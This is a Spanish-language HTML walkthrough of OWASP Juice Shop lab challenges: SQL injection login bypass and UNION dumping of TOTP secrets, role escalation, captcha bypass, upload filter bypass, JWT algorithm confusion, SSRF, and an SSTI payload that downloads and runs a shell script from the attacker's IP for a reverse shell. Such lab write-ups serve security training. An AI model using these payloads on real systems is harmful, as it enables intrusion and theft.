@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Juice Shop</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/inter-ui/3.19.3/inter.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <link href="../../insidestyles/styles.css" rel="stylesheet">
+    <style>
+        .step-content {
+            margin: 2rem 0;
+        }
+
+        .image-placeholder {
+            background: var(--color-bg-dark);
+            border: 1px solid var(--color-border);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            text-align: center;
+            color: var(--color-text-dim);
+        }
+
+        .code-explanation {
+            background: rgba(0, 255, 157, 0.05);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+
+        .section-divider {
+            border-top: 1px solid var(--color-border);
+            margin: 3rem 0;
+        }
+
+        .code-block pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+    </style>
+</head>
+
+<body>
+    <nav class="navbar">
+        <a href="../index.html" class="back-link">Inicio</a>
+        <div class="dropdown">
+            <button class="dropbtn">Secciones</button>
+            <div class="dropdown-content">
+                <a href="#admin-registration">Admin Registration</a>
+                <a href="#database-schema">Database Schema</a>
+                <a href="#multiple-likes">Multiple Likes (Captcha Bypass)</a>
+                <a href="#two-factor">Two Factor Authentication</a>
+                <a href="#upload-type">Upload Type</a>
+                <a href="#manipulate-basket">Manipulate Basket</a>
+                <a href="#forged-jwt">Forged Signed JWT</a>
+                <a href="#premium-paywall">Premium Paywall</a>
+                <a href="#ssti">SSTI</a>
+                <a href="#ssrf">SSRF</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <h1>JUICE SHOP</h1>
+
+        <!-- Admin Registration -->
+        <div class="card" id="admin-registration">
+            <h3>Admin Registration</h3>
+            <div class="section-content">
+                <p>Para dar contexto vamos a realizar una inyección SQL para acceder como la cuenta de administrador
+                    existente y recabar algunos datos.</p>
+
+                <div class="code-block">
+                    <pre>
+' OR '1'='1
+                    </pre>
+                </div>
+
+                <div class="image-placeholder">
+                    <img src="img/1.png" alt="Login SQL Injection">
+                    <p>Inyección SQL básica para acceso</p>
+                </div>
+
+                <p>Una vez dentro de la cuenta de administrador necesitamos acceder al json donde se almacenan los datos
+                    de los usuarios. En la pestaña network dentro de las herramientas para developers de nuestro
+                    navegador podemos encontrar
+                    el archivo.
+                </p>
+
+                <div class="image-placeholder">
+                    <img src="img/2.png" alt="JSON User Data">
+                    <img src="img/x.png" alt="JSON User Data">
+                    <p>Al hacer click en los detalles de las cuentas se cargan archivos JSON con los datos de usuario
+                    </p>
+                </div>
+
+                <p>Como vemos en el json, en los parámetros que se mandan a la hora de crear un usuario hay uno que por
+                    defecto se añade y es el "role", que en el perfil de admin se establece como "admin" pero en otros
+                    usuarios indica "customer".
+                    Para modificarlo vamos a interceptar la petición y añadir el parámetro "role" a la petición.
+                </p>
+
+                <div class="image-placeholder">
+                    <img src="img/3.png" alt="Request Intercepted">
+                    <p>Interceptamos la petición para crear una cuenta nueva</p>
+                </div>
+
+                <p>Añadimos el parámetro "role" a la petición y como vemos se modifica haciendo la cuenta administrador.
+                </p>
+            </div>
+        </div>
+
+        <div class="section-divider"></div>
+
+        <!-- Database Schema -->
+        <div class="card" id="database-schema">
+            <h3>Database Schema</h3>
+            <div class="section-content">
+                <p>Para esta vulnerabilidad vamos a aprovechar el input de búsqueda dentro de la tienda. Como vemos es
+                    sencillamente un input para buscar productos en la web lo que posiblemente implique que haga una
+                    consulta a la base de datos y devuelva los resultados.</p>
+
+                <p>Para comprobar si es o no vulnerable vamos a provocar un error de sintaxis.</p>
+
+                <div class="image-placeholder">
+                    <img src="img/4.png" alt="Search Input">
+                    <p>Input de búsqueda vulnerable a SQLi</p>
+                </div>
+
+                <p>Comprobamos cuantas columnas tiene la tabla de productos haciendo una consulta normal</p>
+
+                <div class="image-placeholder">
+                    <img src="img/5.png" alt="Search">
+                </div>
+
+                <p>Observamos que cuenta con 9 columnas vamos a intentar inyectar un Union. Por como funciona sqlite
+                    aquí no incluimos la columna con "null" sino números.</p>
+
+                <p>Para esta parte vamos a encodear la consulta en URL para no tener problemas en la sintaxis.</p>
+
+                <div class="code-block">
+                    <pre>
+' UNION SELECT 1,2,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--
+                    </pre>
+                </div>
+
+                <div class="image-placeholder">
+                    <img src="img/6.png" alt="URL Encoded Query">
+                    <p>Consulta URL encoded</p>
+                </div>
+
+                <p>Como se trata de una base de datos sqlite tendremos que buscar información sobre cómo almacena los
+                    datos y cómo podemos llamarlos.</p>
+
+                <div class="image-placeholder">
+                    <img src="img/7.png" alt="sqlite">
+                    <img src="img/8.png" alt="URL Encoded Query">
+                    <img src="img/9.png" alt="response">
+                </div>
+            </div>
+        </div>
+
+        <div class="section-divider"></div>
+
+        <!-- Multiple Likes -->
+        <div class="card" id="multiple-likes">
+            <h3>Multiple Likes (Captcha Bypass)</h3>
+            <div class="section-content">
+                <p>Para esta vulnerabilidad vamos a hacer uso del apartado feedback de la web. Aquí vamos a ver cómo de
+                    forma anónima vamos a poder crear un comentario sobre la web.</p>
+
+                <div class="image-placeholder">
+                    <img src="img/10.png" alt="Feedback Form">
+                    <p>Formulario de feedback con captcha</p>
+                </div>
+
+                <p>Al rellenar el formulario vemos que cuenta con un captcha para evitar scripts de automatización para
+                    por ejemplo dejar malas reseñas pero si indagamos un poco más...</p>
+
+                <div class="image-placeholder">
+                    <img src="img/11.png" alt="burp-capture">
+                    <p>Vemos que los parámetros que se pasan
+                        son el id del captcha ya que habrá varios
+                        establecidos para que vayan cambiando,
+                        la solución del captcha, el comentario y la
+                        puntuación.</p>
+                </div>
+                <p>Para poder abusar de esto podemos bien hacerlo mediante burpsuite o con un script en python.</p>
+                <div class="image-placeholder">
+                    <img src="img/12.png" alt="Burp Intruder">
+                    <p>Configuración en Burp Suite para automatizar peticiones</p>
+                </div>
+                <div class="image-placeholder">
+                    <img src="img/13.png" alt="python script">
+                    <p>En este trozo establecemos un array con algunos mensajes negativos para crear las reviews
+                        y estructuramos el encabezado de la petición que se realiza a la web copiandolo de la que
+                        hemos capturado en burpsuite.</p>
+                    <img src="img/14.png" alt="python script">
+                    <p>En esta sección introducimos los datos que manda la petición aunque en este caso cambié
+                        el captcha porque el anterior me estaba dando algún problema por lo que capturé algunas
+                        peticiones más de la web y cogí el captcha 0 que me funcionó correctamente.
+                        Indicamos que mande la petición en forma de post con la url, los headers y el json (datos) y
+                        que la respuesta que obtenga la devuelva en texto plano.
+                        Más abajo simplemente creamos una reiteración de la función tantas veces como elementos
+                        tenemos en el array de los mensajes por lo que serán 10 peticiones a 1 por segundo e
+                        imprime un poco el proceso.</p>
+                    <p>Como resultado</p>
+                    <img src="img/15.png" alt="python script">
+                    <img src="img/16.png" alt="python script">
+
+                </div>
+            </div>
+        </div>
+        <div class="section-divider"></div>
+
+        <!-- Two Factor Authentication -->
+        <div class="card" id="two-factor">
+            <h3>Two Factor Authentication</h3>
+            <div class="section-content">
+                <p>Para este proceso vamos a necesitar ir a cualquier perfil que tengamos acceso y probar a crear
+                    una
+                    autenticación de doble factor.</p>
+
+                <div class="image-placeholder">
+                    <img src="img/17.png" alt="2FA Setup">
+                    <p>Configuración inicial de 2FA</p>
+                </div>
+
+                <p>Dentro vamos a ir a las opciones de seguridad y crear un autenticador 2FA.</p>
+                <p>Vamos a necesitar exfiltrar de nuevo el esquema de la tabla usuarios de la base de datos para
+                    observar la existencia de un parámetro</p>
+
+                <div class="image-placeholder">
+                    <img src="img/18.png" alt="users table">
+                    <p>Datos de la tabla users</p>
+                </div>
+
+                <p>Si nos fijamos en los nombres de las columnas hay una que se llama "totpsecret" y estamos
+                    intentando
+                    conseguir el 2FA de un usuario, por lo que deducimos que si TOTP se trata de las siglas
+                    "time-based
+                    one-time password", pues "toptsecret" algo puede tener que ver.</p>
+
+                <div class="code-block">
+                    <pre>
+' UNION SELECT id,email,totpsecret FROM users--
+                    </pre>
+                </div>
+
+                <p>En la query que realizamos hacemos un union con los nombres de las columnas que nos interesan y
+                    el
+                    resto lo saltamos e indicamos que la base de datos de la que queremos los datos se llama users.
+                </p>
+
+                <div class="image-placeholder">
+                    <img src="img/19.png" alt="TOTP Extract">
+                    <p>Extracción del secreto TOTP</p>
+                </div>
+
+                <p>Teniendo el token del TOTP podemos hacer uso de una web para que genere lso códigos 2FA de ese
+                    usuario.</p>
+                <div class="image-placeholder">
+                    <img src="img/20.png" alt="2FA Token Generator">
+                    <p>Generador de tokens 2FA</p>
+                </div>
+            </div>
+        </div>
+        <div class="card" id="upload-type">
+            <h3>Upload Type</h3>
+            <div class="section-content">
+                <p>Primero vamos a hacer login con cualquier usuario del que tengamos acceso por ejemplo "wurstbrot"
+                    de
+                    la anterior vulnerabilidad.</p>
+
+                <div class="image-placeholder">
+                    <img src="img/21.png" alt="Upload Interface">
+                    <p>Interfaz de subida de archivos</p>
+                </div>
+
+                <p>Parece que está filtrado para documentos pdf y archivos comprimidos zip. Pues vamos a modificar
+                    la
+                    extensión de la shell a ver si cuela y además lo capturamos con burpsuite a ver si podemos
+                    modificar
+                    la extensión en el aire.</p>
+
+                <div class="image-placeholder">
+                    <img src="img/22.png" alt="Upload Interface">
+                    <p>Interfaz de subida de archivos</p>
+                </div>
+
+                <p>Por ahora lo ha aceptado por lo que vamos a modificar la extensión y eliminar el .zip y
+                    observamos
+                    que lo sube sin problema.</p>
+
+
+                <div class="code-block">
+                    <pre>
+Content-Type: application/zip
+...
+shell.php.zip → shell.php
+                    </pre>
+                    <div class="image-placeholder">
+                        <img src="img/23.png" alt="Completed Upload">
+                    </div>
+                </div>
+
+
+            </div>
+        </div>
+
+        <div class="section-divider"></div>
+
+        <!-- Manipulate Basket -->
+        <div class="card" id="manipulate-basket">
+            <h3>Manipulate Basket</h3>
+            <div class="section-content">
+                <p>Para esta vulnerabilidad vamos a iniciar sesión como cualquier usuario menos administrador ya que
+                    nuestro objetivo es añadir a su cesta algún producto desde otra cuenta de usuario.</p>
+                <p>Si en burpsuite vamos al historial http vamos a ver como cada vez que se añade un producto
+                    se llama a dos api`s distintas.</p>
+
+                <div class="image-placeholder">
+                    <img src="img/24.png" alt="Basket API">
+                    <p>Petición a la API de cestas</p>
+                </div>
+
+                <p>Dentro de la petición más abajo vemos como añade el id de producto 24 a la cesta con id 4 en
+                    cantidad
+                    de 1.</p>
+
+                <div class="image-placeholder">
+                    <img src="img/25.png" alt="peticiones ">
+
+                    <p>Investigando un poco vemos que se puede hacer un bypass dejando el id de la cesta original en 4 y
+                        luego añadir otro id de cesta para que se añada en esa sin que nos de error.</p>
+
+                    <div class="image-placeholder">
+                        <img src="img/26.png" alt="Basket ">
+                        <img src="img/27.png" alt="Basket ">
+                        <p>producto añadido</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="section-divider"></div>
+
+        <!-- Forged JWT -->
+        <div class="card" id="forged-jwt">
+            <h3>Forged Signed JWT</h3>
+            <div class="section-content">
+                <p>En esta vulnerabilidad vamos a necesitar un token JSON, que es como un paquete digital de
+                    información.</p>
+                <p>Iniciamos sesión con cualquier usuario y si hemos prestado atención a la traza de peticiones que hace
+                    el cliente al servidor en las
+                    anteriores vulnerabilidades vemos que hay unas peticiones interesantes que preguntan “whoami”.</p>
+
+                <div class="image-placeholder">
+                    <img src="img/28.png" alt="whoami">
+                    <p>Para ver más claramente antes de modificar nada lo que hace esta función en el navegador si
+                        abrimos el modo developer y vamos a la pestaña de network podemos ver que es lo que se le está
+                        pasando a “whoami” en forma de json.</p>
+                    <img src="img/29.png" alt="whoami">
+                </div>
+
+                <p>Básicamente es la identificación del usuario, es decir el token JSON que lo identifica dentro de
+                    todas
+                    las funciones de la web.
+                    Bueno pues si vamos a la petición http que realiza vamos a poder ver el token.
+                </p>
+
+                <div class"image-placeholder">
+                    <img src="img/30.png" alt="whoami">
+                </div>
+
+                <div class="code-explanation">
+                    <p>Si buscamos información previa sobre cómo funciona un JWT encontramos una web donde tenemos
+                        tanto
+                        documentación como una aplicación para "decodificar" el contenido de este token.</p>
+                </div>
+
+                <div class="image-placeholder">
+                    <img src="img/31.png" alt="JWT Decoder">
+                    <p>Decodificación del token JWT</p>
+                </div>
+
+                <p>Aquí vamos a modificar entonces el email a rsa_lord@juice-sh.op y el algoritmo de encriptación de
+                    RS256 a HS256.</p>
+
+                <p>"RS256 (Firma RSA con SHA-256) es un algoritmo asimétrico que usa un par de claves
+                    pública/privada: el proveedor de identidad tiene una clave privada (secreta) que usa para generar la
+                    firma, y el consumidor del JWT recibe una clave pública para validar la firma. Como la clave
+                    pública,
+                    a diferencia de la privada, no necesita mantenerse segura, la mayoría de los proveedores de
+                    identidad la hacen fácilmente disponible para que los consumidores la obtengan y usen
+                    (normalmente a través de una URL de metadatos).
+                    HS256 (HMAC con SHA-256), por otro lado, implica una combinación de una función hash y una
+                    (única) clave secreta que se comparte entre las dos partes para generar el hash que servirá como
+                    firma. Como se usa la misma clave tanto para generar la firma como para validarla, hay que tener
+                    cuidado para asegurar que la clave no se vea comprometida.</p>
+
+                <p>En este punto suponemos que realizando un ataque de web discovering encontramos un directorio
+                    llamado “encryptionkeys” donde se encuentra la llave RSA pública.</p>
+                <div class"image-placeholder">
+                    <img src="img/32.png" alt="RSA">
+                </div>
+                <p>Para crear la firma usamos esta <a
+                        href="https://www.devglan.com/online-tools/hmac-sha256-online">herramienta</a> y la clave
+                    pública que
+                    encontramos en el directorio “encryptionkeys”.</p>
+                <div class="image-placeholder">
+                    <img src="img/33.png" alt="JWT">
+                    <p>En texto plano debemos introducir los datos del token que teníamos de color rosado en la web
+                        anterior JWT sin la parte azul que pertenece a la firma</p>
+                    <p>En la secret key introducimos el RSA public key.
+                        Marcamos como sha256 y que el encoder sea base64.</p>
+                </div>
+                <p>Esa llave la vamos a llevar a cyberchef para hacerla “URL safe”</p>
+                <div class"image-placeholder">
+                    <img src="img/34.png" alt="JWT">
+                    <img src="img/35.png" alt="JWT">
+                    <p>Es importante primero decodificar de base64 estándar y luego codificar a base64url safe.
+                        Copiamos la salida y la modificamos directamente en el token reemplazando la zona azul.</p>
+                </div>
+                <p>Ahora si podemos copiar el token y modificar la petición en burpsuite.</p>
+
+                <div class="image-placeholder">
+                    <img src="img/36.png" alt="JWT">
+                    <img src="img/37.png" alt="JWT">
+                </div>
+
+            </div>
+        </div>
+
+        <div class="section-divider"></div>
+
+        <!-- Premium Paywall -->
+        <div class="card" id="premium-paywall">
+            <h3>Premium Paywall</h3>
+            <div class="section-content">
+                <p>Si nos fijamos bien en la anterior vulnerabilidad donde encontramos la clave pública RSA tenemos
+                    un
+                    archivo interesante más "premium.key".</p>
+
+                <div class="image-placeholder">
+                    <img src="img/38.png" alt="Premium">
+                    <p>Si usamos un poco de investigación eficaz podemos intentar deducir qué es esto.
+                        Primera parte: "1337133713371337"
+                        1337 repetido 4 veces, es un número significativo
+                        Segunda parte: "EA99A61D92D2955B1E9285B55BF2AD42"
+                        Parece ser un hash MD5 (por su longitud de 32 caracteres hexadecimales)
+                    </p>
+                </div>
+
+                <p>Tras un rato dando vueltas sin rumbo y un poquito de ayuda podemos encontrar un comentario
+                    extraño en
+                    el código fuente de la página de score boards.</p>
+
+                <div class="image-placeholder">
+                    <img src="img/39.png" alt="Premium">
+                    <img src="img/40.png" alt="Premium">
+                    <p>Mensaje cifrado en el código fuente</p>
+                </div>
+                <p>Teniendo este mensaje cifrado y con la llave que ya encontramos antes deducimos que se
+                    trata de un cifrado AES256 CBC por lo que podemos decodificarlo</p>
+
+                <div class"image-placeholder">
+                    <img src="img/41.png" alt="Premium">
+                    <p>Si visitamos la URL se completa el reto</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="section-divider"></div>
+
+        <!-- SSTI -->
+        <div class="card" id="ssti">
+            <h3>Server Side Template Injection</h3>
+            <div class="section-content">
+                <p>Es una vulnerabilidad que ocurre cuando un atacante puede inyectar código malicioso en
+                    una plantilla que luego se ejecuta en el servidor y ocurre cuando la entrada del usuario se
+                    inserta directamente en una plantilla.
+                    Por lo tanto hay que encontrar alguna página en la web que se base en plantillas, que en es
+                    la del perfil.
+                    En el apartado de nombre de usuario podemos introducir uno y este se muestra bajo la
+                    imagen del perfil.</p>
+
+                <div class="image-placeholder">
+                    <img src="img/42.png" alt="Template Injection">
+                    <p>Para saber si la plantilla es vulnerable o si usa una plantilla esto dependerá del tipo de motor
+                        que use y el lenguaje. En este caso ya sabemos que usa JS y el motor de plantillas es PUG</p>
+                </div>
+
+                <div class="image-placeholder">
+                    <img src="img/43.png" alt="Template Injection">
+                    <p>Ahora en vez de usar el “malware” que está ahí en internet para este ctf vamos
+                        a crear el nuestro propio que no va a ser más que una shell reversa en bash</p>
+                </div>
+
+                <div class="code-block">
+                    <pre>
+#{global.process.mainModule.require('child_process')
+  .exec('wget http://192.168.93.131:8000/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && bash /tmp/shell.sh')}
+                    </pre>
+                </div>
+
+                <p>En resumidas cuentas haciendo uso de JS indicamos que descargue el shell.sh de nuestra
+                    máquina kali (que está sirviendo el archivo por http usando python), lo mande a la carpeta
+                    tmp, le de permisos de administrador y luego lo ejecute.
+                    Teniendo esto listo y antes de introducir el payload en el parámetro vulnerable preparamos
+                    tanto el archivo para servir como la escucha en el puerto 5555.</p>
+
+                <div class"image-placeholder">
+                    <img src="img/44.png" alt="Template Injection">
+                    <p>Ahora si inyectamos el payload en el parámetro de username.</p>
+                    <img src="img/45.png" alt="Template Injection">
+                    <p>Listo tenemos acceso remoto a la máquina del servidor.</p>
+
+                </div>
+            </div>
+        </div>
+        <div class="section-divider"></div>
+
+        <!-- SSRF -->
+        <div class="card" id="ssrf">
+            <h3>Server Side Request Forgery</h3>
+            <div class="section-content">
+                <p>El concepto es llegar a acceder contenido oculto o no visible al usuario dentro del sistema de
+                    archivos del servidor. En este caso el parámetro vulnerable se trata de una imagen y está
+                    contenido dentro de una etiqueta IMG por lo que en principio no podremos ver contenido en
+                    texto plano o renderizar otra cosa que no sea img.
+                    El funcionamiento del parámetro dentro de la web es un prompt donde podemos introducir
+                    una URL para establecer nuestra foto de perfil desde un link externo.</p>
+
+                <div class="image-placeholder">
+                    <img src="img/46.png" alt="SSRF Attack">
+                    <p>Si introducimos una url de alguna imagen e inspeccionamos el contenido de la página
+                        veremos que el servidor web de juicy hace un request a la url, descarga la imagen y la
+                        muestra.</p>
+                    <img src="img/47.png" alt="SSRF Attack">
+                    <p>Y tenemos acceso a esa URL</p>
+                    <img src="img/48.png" alt="SSRF Attack">
+                </div>
+
+                <p>Tras una exhaustiva investigación he llegado a la conclusión de que el proceso que se realiza en
+                    el
+                    servidor es el siguiente:</p>
+
+                <ul class="step-list">
+                    <li>Al poner la URL externa comprueba si es una imagen directa, si es así la descarga, la
+                        renombra
+                        con el id del usuario y la almacena en "frontend/dist/frontend/assets/public/images/uploads"
+                    </li>
+                    <li>Sea lo que sea el contenido de la URL lo descarga, es decir que aunque nosotros sirvamos un
+                        documento txt, el servidor lo descarga y lo renombra y almacena como un userID.jpg</li>
+                </ul>
+                <p>Con esto claro lo que podemos hacer es indicar direcciones de posibles archivos dentro del
+                    servidor para que realice esa copia en el directorio uploads y nosotros podamos descargarlo
+                    con un wget, por ejemplo:</p>
+
+                <div class"image-placeholder">
+                    <img src="img/49.png" alt="SSRF Attack">
+                    <p>En el servidor en el path de la ruta a la que se descargan sabemos que existe una carpeta
+                        private</p>
+                    <img src="img/50.png" alt="SSRF Attack">
+                    <p>Podemos intentar hacer referencia a alguno de los archivosv “js” que existen.</p>
+                    <img src="img/51.png" alt="SSRF Attack">
+                    <p>Ahora desde nuestra máquina podemos acceder al recurso, descargarlo y ver su contenido.</p>
+
+                </div>
+
+                <div class="code-explanation">
+                    <p>A tener en cuenta es que el servidor por algún motivo que aún no entiendo solo encuentra
+                        archivos desde la ruta de assets y no podemos ir más atrás de ese directorio o al menos aún
+                        no lo he conseguido por lo que no podemos filtrar documentos del sistema por ahora.
+                        El servidor al no encontrar los archivos lo que hace es crear el userID.jpg con una
+                        plantilla
+                        html que tiene por defecto por lo que no sirve de nada</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <footer class="footer">
+        <p>© 2024 - Guía de Vulnerabilidades Juice Shop</p>
+    </footer>
+</body>
+
+</html>
